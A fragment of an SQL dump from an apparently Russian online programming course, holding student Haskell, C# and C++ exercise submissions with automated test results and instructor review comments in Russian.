(693, 25, '355679', '2012-09-19 19:48:08', 1, 'minlist (x:[]) = x\r\n\r\nminlist (x:y:z) = if x < y then minlist (x:z) else minlist (y:z)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(691, 27, '4748987', '2012-09-19 19:24:23', 1, 'minsum1 n [p] = n\r\nminsum1 n (h:t) = minsum1 (min(n h+head t)) t\r\n   --- У вас тут лишние скобки после min, из за этого не компилировалось\r\nminsum (h:t) = minsum1 (h + head t)) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(692, 25, '14561781', '2012-09-19 19:44:20', 0, 'minlist [x, y] = if x > y \r\n\n                       then y\r\n\n                       else x\r\n\nminlist (x : y : xs) \r\n\n   | x > y = minlist (y : xs)\r\n\n   | otherwise = minlist (x : xs)\n', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(694, 28, '5656962', '2012-09-19 19:55:05', 1, 'check cond [] = False\r\n\r\ncheck cond (x:xs) = \r\n\r\n	if cond x == True \r\n  --- или просто if cond\r\n\r\n		then True\r\n\r\n		else check cond xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(695, 22, '63706456', '2012-09-19 20:25:03', 1, 'g x = canSplitAcc x 2\r\ncanSplitAcc x y | y < (div (x+1) 2) = \r\n			if (isSimple (x-y)) && (isSimple y) \r\n     --- тут внешние скобки не нужны \r\n				then True\r\n				else canSplitAcc x (y+1)\r\n		| otherwise = False\r\n\r\nisSimple x = isSimpleAcc x 2\r\n\r\nisSimpleAcc x y | (div x 2) >= y = if (mod x y) == 0 \r\n   --- лучше проверять y*y > x\r\n   --- ведь если число не простое, то у него есть делитель меньше квадр. корня\r\n				then False \r\n				else isSimpleAcc x (y+1)\r\n		| otherwise = True', '<br/>Тесты успешно пройдены!'),
(696, 29, '4169333', '2012-09-19 20:26:05', 1, 'checkDifferent [] =error "Empty list"\r\nchechDifferent lst =sort(lst)\r\nsort lst =check1 lst\r\n  --- Засчитано, но тут у вас что-то странное.. Вы написали что sort - это check1 - а почему?? Наверное что-то другоке имелось в виду?\r\ncheck1 (x2:[])= True\r\ncheck1  (x1:x2:xs)\r\n	|(x1 /= x2) = check1 (x2:xs)\r\n	|otherwise = False \r\n', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(697, 25, '9539826', '2012-09-19 20:27:59', 1, 'minlist [x] = x\r\nminlist [x, y] = if x < y then x else y\r\nminlist (x:(y:z)) =minlist ((minlist [x,y]) : z) ', '<br/>Тесты успешно пройдены!'),
(698, 29, '5656962', '2012-09-19 20:32:23', 1, 'checkDifferent [] = True\r\n\r\ncheckDifferent (x:xs) = \r\n\r\n	if checkOne (x:xs) == False\r\n\r\n		then False\r\n\r\n		else checkDifferent xs\r\n\r\ncheckOne [] = True\r\n\r\ncheckOne [x] = True\r\n\r\ncheckOne (x:y:xs) =\r\n\r\n	if x == y \r\n\r\n		then False\r\n\r\n		else checkOne(x:xs)\r\n\r\n	\r\n', '<br/>Тесты успешно пройдены!'),
(699, 28, '985727', '2012-09-19 20:38:23', 0, 'check cond [x] = cond x\r\ncheck cond x = if (cond (head x)) then True else check cond (tail x)', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(700, 28, '985727', '2012-09-19 20:39:24', 1, 'check cond [] = False\r\ncheck cond [x] = cond x\r\ncheck cond x = if (cond (head x)) then True else check cond (tail x)', '<br/>Тесты успешно пройдены!'),
(701, 25, '14561781', '2012-09-19 21:14:40', 1, 'minlist [x] = x\r\n\r\nminlist [x, y] = if x > y \r\n\r\n                       then y\r\n\r\n                       else x\r\n\r\nminlist (x : y : xs) \r\n\r\n   | x > y = minlist (y : xs)\r\n\r\n   | otherwise = minlist (x : xs)\r\n', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(702, 27, '14561781', '2012-09-19 21:16:14', 1, 'sum2 [] = []\r\n\r\nsum2 [x] = []\r\n\r\nsum2 (x : y : xs) = (x + y) : sum2 (y : xs)\r\n\r\n\r\n\r\nminlist [x] = x\r\n\r\nminlist [x, y] = if x > y \r\n\r\n                       then y\r\n\r\n                       else x\r\n\r\nminlist (x : y : xs) \r\n\r\n   | x > y = minlist (y : xs)\r\n\r\n   | otherwise = minlist (x : xs)\r\n\r\n\r\n\r\nminsum [x] = x\r\n\r\nminsum xs = minlist(sum2 xs)\r\n', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(703, 27, '51559263', '2012-09-19 21:23:03', 1, 'ms [last] min = min\r\n   --- просто как замечание, вместо last можно _\r\nms xs min | sum < min = ms (tail xs) (sum)\r\n          | otherwise = ms (tail xs) (min)\r\n          where sum = head xs + head (tail xs)\r\n\r\nminsum xs = ms (tail xs) (head xs + head (tail xs))', '<br/>Тесты успешно пройдены!'),
(704, 28, '442421', '2012-09-19 21:33:22', 0, 'check c x = check'' (map c x)\r\n\r\ncheck'' (True:xs) = True\r\ncheck'' (False:[]) = False\r\ncheck'' (False:xs) = check'' xs', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(705, 28, '442421', '2012-09-19 21:34:41', 1, 'check c [] = False\r\ncheck c x = check'' (map c x)\r\n\r\n   --- Я бы написал check'' [] = False, и тогда первое правило check и второе правило check'' не нужны \r\ncheck'' (True:xs) = True\r\ncheck'' (False:[]) = False\r\ncheck'' (False:xs) = check'' xs\r\n', '<br/>Тесты успешно пройдены!'),
(706, 27, '9539826', '2012-09-19 21:36:17', 0, 'minsum [x] = x\r\nminsum [x, y] = x+y\r\nminsum (x:(y:(z:q))) =if x+y<y+z then minsum ((x:(y : q))) else minsum ((y:(z : q))) ', 'Выражение имеет неправильное значение: minsum [1,8,3,2,7]'),
(707, 27, '9539826', '2012-09-19 21:38:16', 0, 'minsum [x] = x\r\nminsum [x, y] = x+y\r\nminsum [x, y,z] = if x+y<y+z then x+y else y+z\r\nminsum (x:(y:(z:q))) =if x+y<y+z then minsum ((x:(y : q))) else minsum ((y:(z : q)))', 'Выражение имеет неправильное значение: minsum [1,8,3,2,7]'),
(708, 29, '985727', '2012-09-19 21:45:38', 1, 'checkDifferent [] = True\r\ncheckDifferent x = if( (head x) `elem` (tail x)) then False else checkDifferent (tail x)', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(709, 26, '51559263', '2012-09-19 21:49:39', 1, 'rev [] = []\r\nrev xs = (last xs) : (rev (init xs))\r\n   ---- ОК, но это вообще-то будет медленное рещение, за O(n^2), потому что и last и init работают за O(n)  ', '<br/>Тесты успешно пройдены!'),
(710, 27, '9539826', '2012-09-19 22:05:17', 1, '   --- Вообще хорошее решение! Но вот замечания:\r\nminsum [x] = x\r\n   --- Это я бы просто не писал, можно считать, что в этом случае функция просто не определена\r\nminsum [x, y] = x+y\r\nminsum [x, y,z] = if x+y<y+z then x+y else y+z\r\n  --- 2 и 3 правила для minsum вроде бы не нужны, достаточно только последнего правила.\r\nminsum x = minimum (listsum x)\r\n\r\nlistsum [x,y] = [x+y]\r\nlistsum (x:(y:z)) = (x+y):(listsum (y:z))\r\n', '<br/>Тесты успешно пройдены!'),
(711, 23, '533223', '2012-09-19 22:34:04', 1, 'c x = quanList (c3 x x)\r\n\r\nc3 2 _ = [[2]]\r\nc3 1 _ = [[1]]\r\nc3 0 x = [[]]\r\nc3 x 0 = []\r\nc3 x y =  (listsCoprimeTo y (c3 (x-y) (min2 (y-1) (x-y)))) ++ (c3 x (y-1))\r\n\r\nlistsCoprimeTo x [] = []\r\nlistsCoprimeTo x (y:ys) = if (isCoprimeToList x y)\r\n				then (x:y):(listsCoprimeTo x ys)\r\n				else listsCoprimeTo x ys\r\n\r\nisCoprimeToList x [] = True\r\nisCoprimeToList x (y:ys) = if (isCoprime x y)\r\n				then isCoprimeToList x ys\r\n				else False\r\n\r\nquanList [] = 0\r\nquanList (x:xs) = 1+(quanList xs)\r\n   --- Как вариант, можно использовать стандартную функцию length \r\n\r\nmin2 x y = if (x<y) then x\r\n		else y\r\n\r\nisCoprime x 0 = False\r\nisCoprime x 1 = True\r\nisCoprime x y = if (x>y)\r\n			then isCoprime y (rem x y)\r\n			else isCoprime x (rem y x)', '<br/>Тесты успешно пройдены!'),
(712, 29, '9539826', '2012-09-19 22:53:41', 1, 'checkDifferent [x] = True\r\ncheckDifferent (x:xs)=(checkDifferent1 x xs) && checkDifferent xs\r\n\r\ncheckDifferent1 x [y] = (x/=y)\r\ncheckDifferent1 x xs = ((x/=head xs) && (checkDifferent1 x (tail xs)))\r\n   --- честь скобок лишние, можно x/=head xs && checkDifferent1 x (tail xs) ', '<br/>Тесты успешно пройдены!'),
(713, 28, '51559263', '2012-09-19 22:56:32', 1, 'chk _ _ True = True\r\nchk _ ([]) _ = False\r\n   --- тут скобки лишние (квадратные скобки - это тоже скобки, ничуть не хуже круглых:)\r\nchk cond xs res = chk (cond) (tail xs) (cond (head xs) || res)\r\n\r\ncheck cond xs = chk cond xs False\r\n', '<br/>Тесты успешно пройдены!'),
(714, 25, '83813', '2012-09-20 00:53:11', 1, 'minlist [x] = x\r\nminlist (x:xs) = min x (minlist xs)', '<br/>Тесты успешно пройдены!'),
(715, 27, '83813', '2012-09-20 00:55:23', 1, 'minsum [x,y] = x + y\r\nminsum (x:y:xs) = min (x + y) (minsum (y:xs))', '<br/>Тесты успешно пройдены!'),
(716, 26, '83813', '2012-09-20 00:57:40', 1, 'rev1 [] l = l\r\nrev1 (x:xs) l = rev1 xs (x:l)\r\n\r\nrev l = rev1 l []', '<br/>Тесты успешно пройдены!'),
(717, 28, '83813', '2012-09-20 01:00:52', 1, 'check cond [] = False\r\ncheck cond (x:xs) = cond x || (check cond xs)\r\n', '<br/>Тесты успешно пройдены!'),
(718, 29, '83813', '2012-09-20 01:03:54', 1, 'check cond [] = False\r\ncheck cond (x:xs) = cond x || (check cond xs)\r\n\r\ncheckDifferent [] = True\r\ncheckDifferent (x:xs) = not (check (y -> x == y) xs) && checkDifferent xs\r\n', '<br/>Тесты успешно пройдены!'),
(719, 23, '442421', '2012-09-20 06:37:01', 0, 'c n = 1 + nseq1 0 n\r\n\r\nnseq1 a n = \r\n	if mod n 2 == 0 then \r\n		forLoop (a+1) ((div n 2)-1) n 0 \r\n	else \r\n		forLoop (a+1) (div n 2) n 0\r\n\r\n\r\nforLoop i ub n r = \r\n	if i<=ub then \r\n		if gcd i (n-i) > 1\r\n		then forLoop (i+1) ub n r -- continue\r\n		else forLoop (i+1) ub n (r+1+nseq1 i (n-i))	\r\n\r\n	else \r\n		r\r\n', 'Выражение имеет неправильное значение: c 9'),
(720, 25, '471091', '2012-09-20 07:10:32', 0, 'getListMin (x:xs) = fun (x:xs) x\r\n    where\r\n        fun (x:[]) min = min\r\n        fun (x:xs) min | x  < min  = fun xs x\r\n                       | otherwise = fun xs min\r\n', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(721, 23, '442421', '2012-09-20 07:11:26', 0, 'c n = 1 + nseq1 0 n 1\r\n\r\nnseq1 a n s = \r\n	if mod n 2 == 0 then \r\n		forLoop (a+1) ((div n 2)-1) n 0 s\r\n	else \r\n		forLoop (a+1) (div n 2) n 0 s\r\n\r\n\r\nforLoop i ub n r s = \r\n	if i<=ub then \r\n		if continue i (n-i) s\r\n		then forLoop (i+1) ub n r s\r\n		else forLoop (i+1) ub n (r+1+nseq1 i (n-i) (s*i)) s 	\r\n\r\n	else \r\n		r\r\n\r\n\r\ncontinue a b s = gcd a b > 1 || gcd a s > 1 || gcd b s >1', 'Выражение имеет неправильное значение: c 10'),
(722, 25, '471091', '2012-09-20 07:12:19', 0, 'getListMin (x:xs) = fun (x:xs) x\r\nfun (x:[]) min = min\r\nfun (x:xs) min | x  < min  = fun xs x\r\n               | otherwise = fun xs min\r\n', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(723, 25, '471091', '2012-09-20 07:16:16', 1, 'minlist (x:xs) = fun (x:xs) x\r\n    where\r\n        fun (x:[]) min = min\r\n        fun (x:xs) min | x  < min  = fun xs x\r\n                       | otherwise = fun xs min', '<br/>Тесты успешно пройдены!'),
(724, 27, '471091', '2012-09-20 07:17:11', 1, 'minsum (x:[])   = x\r\nminsum (x:y:xs) = fun (y:xs) (x+y)\r\n    where\r\n        fun (x:[])   sum = sum\r\n        fun (x:y:xs) sum | x+y < sum = fun (y:xs) (x+y)\r\n                         | otherwise = fun (y:xs) sum\r\n', '<br/>Тесты успешно пройдены!'),
(725, 26, '471091', '2012-09-20 07:19:29', 1, 'rev = foldl (flip (:)) []\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(726, 28, '471091', '2012-09-20 07:20:42', 1, 'check func xs = foldl (||) False (map func xs)', '<br/>Тесты успешно пройдены!'),
(727, 29, '471091', '2012-09-20 07:21:26', 1, 'checkDifferent (x:[]) = True\r\ncheckDifferent (x:xs)\r\n    | not (x `elem` xs) = checkDifferent xs\r\n    | otherwise         = False', '<br/>Тесты успешно пройдены!'),
(728, 23, '442421', '2012-09-20 07:31:00', 0, 'c n = 1 + nseq1 0 n 1\r\n\r\nnseq1 a n s = \r\n	if mod n 2 == 0 then \r\n		forLoop (a+1) ((div n 2)-1) n 0 s\r\n	else \r\n		forLoop (a+1) (div n 2) n 0 s\r\n\r\n\r\nforLoop i ub n r s = \r\n	if i<=ub then \r\n		if continue i (n-i) s\r\n		then forLoop (i+1) ub n (r+nseq1 i (n-i) (s*i)) s\r\n		else forLoop (i+1) ub n (r+1+nseq1 i (n-i) (s*i)) s 	\r\n\r\n	else \r\n		r\r\n\r\n\r\ncontinue a b s = gcd a b > 1 || gcd a s > 1 || gcd b s >1', 'Выражение имеет неправильное значение: c 20'),
(729, 23, '442421', '2012-09-20 07:47:24', 1, 'c n = 1 + nseq1 0 n 1\r\n\r\nnseq1 a n s = \r\n	if mod n 2 == 0 then \r\n		forLoop (a+1) ((div n 2)-1) n 0 s\r\n	else \r\n		forLoop (a+1) (div n 2) n 0 s\r\n\r\n\r\nforLoop i ub n r s = \r\n	if i<=ub then \r\n		if gcd i s >1\r\n		    then forLoop (i+1) ub n r s\r\n		else if continue i (n-i) s\r\n			then forLoop (i+1) ub n (r+nseq1 i (n-i) (s*i)) s\r\n			else forLoop (i+1) ub n (r+1+nseq1 i (n-i) (s*i)) s 	\r\n\r\n	else \r\n		r\r\n\r\n\r\ncontinue a b s = gcd a b > 1 || gcd a s > 1 || gcd b s >1', '<br/>Тесты успешно пройдены!'),
(730, 29, '442421', '2012-09-20 08:08:03', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = checkDifferent xs && notexists x xs\r\n\r\nnotexists x [] = True\r\nnotexists a (x:xs) = if a==x\r\n			then False\r\n			else notexists a xs', '<br/>Тесты успешно пройдены!'),
(731, 26, '442421', '2012-09-20 08:29:42', 1, 'rev x = rev'' x []\r\n\r\nrev'' [] x = x\r\n\r\nrev'' (x:xs) y = rev'' xs y++[x]\r\n   --- Странное рещение, на самом деле. У вас второй параметр rev'' вообще негде не используется, зачем же вы его вводили, просто интересно? \r\n   --- Или имелось в виду, rev'' (x:xs) y = rev'' xs (y++[x]) ? Но тогда будет непрравильно работать, не то выдавать..\r\n   --- А как у вас - это будет rev'' (x:xs) y = (rev'' xs y)++[x]\r\n   --- И это правильно, но параметр у вообще нигде не используется..\r\n   --- Но ОК, в любом случае засчитано.', '<br/>Тесты успешно пройдены!'),
(732, 27, '355679', '2012-09-20 08:33:41', 1, 'minlist (x:[]) = x\r\n\r\nminlist (x:y:z) = if x < y then minlist (x:z) else minlist (y:z)\r\n\r\n\r\n\r\nminsum a = let minsum1 (x:y:[]) = [x + y]\r\n\r\n	       minsum1 (x:y:z) = (x + y) : minsum1 (y : z)\r\n\r\n	       in minlist (minsum1 a)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(733, 26, '355679', '2012-09-20 08:37:03', 1, 'rev ([]) = []\r\n\r\nrev (x:xs) = rev (xs) ++ [x]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(734, 28, '355679', '2012-09-20 08:53:07', 0, 'check cond (x:[]) = cond x\n\ncheck cond (x:xs) = (cond x) || (check cond xs)\n\n\n', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(735, 28, '355679', '2012-09-20 08:54:20', 1, 'check cond [] = False\r\n\r\ncheck cond (x:[]) = cond x\r\n   --- Это правило на самом деле лишнее, оно следует из двух остальных. \r\n\r\ncheck cond (x:xs) = (cond x) || (check cond xs)\r\n    --- Тут все скобки справа лишние\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(736, 29, '355679', '2012-09-20 09:10:06', 1, 'contains [] y = False\r\n\r\ncontains (x:xs) y = ( (x == y) || (contains xs y) )\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ncheckDifferent []	= True\r\n\r\ncheckDifferent (x:xs)	= ( (not (contains xs x)) && (checkDifferent xs) )\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(737, 29, '14561781', '2012-09-20 09:38:12', 1, 'checkDifferent [x] = [True]\r\n   --- Зря все вы все время пишете [True] и  [False]\r\n   --- Так у вас все время возвращается не логическое значение, а список из одного логического значения\r\n    \r\ncheckDifferent [x, y] = if (x == y)\r\n\r\n                                   then [False]\r\n\r\n                                   else [True]\r\n\r\ncheckDifferent (x : y : xs) \r\n\r\n         | (x /= y) = checkDifferent (y : xs)\r\n   --- Не совсем то, так вы проверяете, что нет двух одинаковых элементов подряд, а они могут быть и не подряд\r\n\r\n         | otherwise = [False]\r\n   --- Но ОК, засчитано, для начала вполне неплохо\r\n', 'Выражение имеет неправильное значение: checkDifferent [3,2,7]'),
(738, 28, '14561781', '2012-09-20 09:39:02', 1, 'check cond xs = map (x -> cond) xs\r\n   --- Тоже засчитано, хотя тут довольно далеко от правильного.. (\r\n   --- Хотя идея применить  map хорошая, но это надо записать map (x -> cond x) xs или просто map cond xs\r\n   --- Но это у вас получится список логических значений. И надо по нему пройти и выяснить, есть ли в нем хотя бы одно True  \r\n', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(739, 33, '374969', '2012-09-20 11:20:31', 0, '\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n	public class Program\r\n	{\r\n		private static void Main(string[] args)\r\n		{\r\n		}\r\n\r\n		public static double integral(Func<double, double> func, double startInterval, double endInterval)\r\n		{\r\n			const int countDeltaInterval = 100;\r\n			var deltaInterval = (endInterval - startInterval)/countDeltaInterval;\r\n			var resultIntegral = 0.0;\r\n			var startDeltaInterval = startInterval;\r\n			while (startDeltaInterval < endInterval)\r\n			{\r\n				resultIntegral += (func(startDeltaInterval) + func(startDeltaInterval + deltaInterval))*deltaInterval/2;\r\n			}\r\n\r\n			return resultIntegral;\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(740, 33, '374969', '2012-09-20 12:20:42', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n	public class Program\r\n	{\r\n		private static void Main(string[] args)\r\n		{\r\n		}\r\n\r\n		public static double integral(Func<double, double> func, double startInterval, double endInterval)\r\n		{\r\n			const int countDeltaInterval = 100;\r\n			var deltaInterval = (endInterval - startInterval)/countDeltaInterval;\r\n			var resultIntegral = 0.0;\r\n			var startDeltaInterval = startInterval;\r\n			while (startDeltaInterval < endInterval)\r\n			{\r\n				resultIntegral += (func(startDeltaInterval) + func(startDeltaInterval + deltaInterval))*deltaInterval/2;\r\n    --- Ну ОК, засчитано, более-менее правильно.\r\n    --- Но только лучше, конечно, сделать так, чтобы в каждой точке func вычислялся один раз.\r\n    --- В данном случае, мне кажется, тут важно экономить. Потому что вы же не знаете и не можете знать,\r\n    --- что это за функция. Может быть ктот-то применит тут функцию, которая по пол часа считает.. \r\n				startDeltaInterval += deltaInterval;\r\n			}\r\n\r\n			return resultIntegral;\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(741, 34, '374969', '2012-09-20 12:21:15', 1, '// ConsoleIntegral.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n\r\n// Функция высшего порядка, которая печатает значениия функции f для чисел от 1 до n\r\n//\r\n// Замечание: \r\n//   В принципе ее можно описать, как обычную функцию, но удобнее описать, как шаблон,\r\n//   тогда будет легко пользоватся лямбда выражениями (см. пример ниже)\r\n\r\ntemplate <class Func>\r\n\r\ndouble integral(Func func, double startInterval, double endInterval)\r\n{\r\n	const int countDeltaInterval = 100;\r\n	double deltaInterval = (endInterval - startInterval)/countDeltaInterval;\r\n	double resultIntegral = 0.0;\r\n	double startDeltaInterval = startInterval;\r\n	while (startDeltaInterval < endInterval)\r\n	{\r\n		resultIntegral += (func(startDeltaInterval) + func(startDeltaInterval + deltaInterval))*deltaInterval/2;\r\n		startDeltaInterval += deltaInterval;\r\n	}\r\n\r\n	return resultIntegral;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n   --- OK, зачтено, но вообще в задачах про С++ и C# желательно, чтобы вы сами писали примеры вызова функции в коде. Просто чтобы было видно, что вы сами ее запускали и проверяли, что она работает\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(742, 35, '517309', '2012-09-20 18:38:53', 0, 'dist (x,y) (x1,y1) = (x-x1)^2 + (y-y1)^2\r\n\r\nisosc p1 p2 p3 = let \r\n   d1 = dist p2 p3\r\n   d2 = dist p1 p3\r\n   d3 = dist p2 p1\r\n  in d1 == d2 || d1 == d3 || d2 == d3\r\n\r\ncybeTable n = map (i->(i, i^3)) [1..n]\r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', 'Не удалось вычислить выражение "isocs (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(743, 35, '517309', '2012-09-20 18:39:39', 0, 'dist (x,y) (x1,y1) = (x-x1)^2 + (y-y1)^2\r\n\r\nisosc p1 p2 p3 = let \r\n   d1 = dist p2 p3\r\n   d2 = dist p1 p3\r\n   d3 = dist p2 p1\r\n  in d1 == d2 || d1 == d3 || d2 == d3\r\n', 'Не удалось вычислить выражение "isocs (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(744, 35, '517309', '2012-09-20 18:43:10', 3, 'dist (x,y) (x1,y1) = (x-x1)^2 + (y-y1)^2\r\n\r\nisosc p1 p2 p3 = let \r\n   d1 = dist p2 p3\r\n   d2 = dist p1 p3\r\n   d3 = dist p2 p1\r\n  in d1 == d2 || d1 == d3 || d2 == d3\r\n', '<br/>Тесты успешно пройдены!'),
(745, 36, '517309', '2012-09-20 18:43:31', 0, 'cybeTable n = map (i->(i, i^3)) [1..n]\r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', 'Не удалось вычислить выражение "cubeTable 4", проверьте правильность синтаксиса'),
(746, 36, '517309', '2012-09-20 18:43:55', 3, 'cubeTable n = map (i->(i, i^3)) [1..n]\r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(747, 37, '517309', '2012-09-20 18:44:16', 0, 'cubeTable n = map (i->(i, i^3)) [1..n]\r\n\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(748, 37, '517309', '2012-09-20 18:44:58', 3, 'minsum _ = 5', 'Выражение имеет неправильное значение: minsum [1,1]'),
(749, 38, '517309', '2012-09-20 18:45:30', 3, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(750, 39, '517309', '2012-09-20 18:45:45', 3, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(751, 40, '517309', '2012-09-20 18:46:00', 3, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(752, 41, '517309', '2012-09-20 18:46:26', 3, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(753, 42, '517309', '2012-09-20 18:46:47', 3, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = -1\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n\r\nminHeight Empty = 10000\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = 1 + min (minHeight l) (minHeight r)\r\n\r\nframe n = [[if (i == 1) || (i == n) || (j == 1) || (j == n) then 1 else 0 | i <- [1..n]] | j <- [1..n]]\r\n\r\ncountOdd = sum . map (`mod`2)  \r\ncountOdd1 = sum . map (`mod`2)  \r\n\r\nmyfoldl = foldl\r\n', '<br/>Тесты успешно пройдены!'),
(754, 35, '397095', '2012-09-20 18:56:57', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = check (sqrlen (x1,y1) (x2,y2)) (sqrlen (x2,y2) (x3,y3)) (sqrlen (x1,y1) (x3,y3))\r\nsqrlen (x1,y1) (x2,y2) = sqr (x1-x2) + sqr (y1-y2)\r\nsqr x = x * x\r\ncheck x y z = x == y || y == z || x == z', '<br/>Тесты успешно пройдены!'),
